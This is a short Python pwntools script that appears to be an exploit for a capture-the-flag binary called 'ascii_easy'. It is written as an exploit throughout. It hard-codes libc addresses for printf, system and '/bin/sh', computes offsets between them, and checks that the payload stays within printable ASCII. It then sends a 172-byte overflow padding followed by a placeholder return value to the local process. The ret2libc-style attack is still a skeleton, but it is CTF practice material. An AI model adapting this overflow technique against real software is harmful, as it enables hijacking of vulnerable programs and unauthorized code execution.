from pwn import *


def check_ascii(data):
    for i in data:
        if ord(i) <= 0x1f or ord(i) > 0x7f:
            return False
    return True


#sample_printf = 0xf764bab0
#sample_system = 0xf763e250
#sample_binsh = 0xf771fa2c

sample_printf = 0xf7e49130
sample_system = 0xf7e3a160
sample_binsh = 0xf7f5e5db

stop_offset = sample_system - sample_printf
btop_offset = sample_binsh - sample_printf

padding = "A"*172
attack = "CCCC"
payload = padding + attack

if not check_ascii(payload):
    print "Bad characters in payload."
    exit()

payload += "\n"

p = process("./ascii_easy")
p.send(payload)
print p.recvall()
